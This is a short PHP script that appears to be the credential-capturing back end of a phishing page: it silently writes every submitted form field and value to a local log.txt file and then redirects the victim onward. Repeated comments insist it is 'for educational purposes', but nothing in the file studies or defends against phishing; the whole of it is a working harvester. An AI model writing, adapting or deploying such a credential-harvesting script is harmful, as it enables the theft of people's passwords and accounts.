<?php
//the app is for educational purposes any reseach, thank you//
header ('Location: next');
//the app is for educational popose //
$handle = fopen("log.txt", "a");
//stop asking d pple for ps//
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
//the app is for educational puposes is the reson ans reseach, thank you//
//the app is for educational puposes is the reson ans reseach, thank you//
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>